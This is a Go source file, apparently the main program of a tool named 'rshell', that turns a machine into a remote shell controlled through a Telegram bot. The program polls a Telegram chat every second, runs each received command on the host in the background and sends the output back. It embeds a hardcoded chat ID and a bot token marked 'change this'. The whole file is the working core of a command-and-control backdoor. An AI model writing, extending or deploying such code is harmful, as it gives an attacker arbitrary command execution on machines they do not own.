package main

import (
	"log"
	"rshell/execute"
	"rshell/messenger"
	"time"
)

const CHAT_ID int64 = 90311632                                      // change this
const TELEGRAM_TOKEN string = "5526760482:AAGweoNtLrHEsLC6whjms78y" // change this

const VERSION string = "0.1"

func main() {

	telegram := *messenger.NewTelegramMessenger(CHAT_ID, TELEGRAM_TOKEN, VERSION)

	for ; ; time.Sleep(time.Second) {

		// Recive command from telegram
		command, err := telegram.Recive()
		if err != nil {
			log.Println("ERROR, telegram.Recive: ", err)
			continue
		}
		log.Println("Recive command", command)

		// Execute command in background and send response to telegram
		execute.RunCommand(&telegram, command)
	}
}
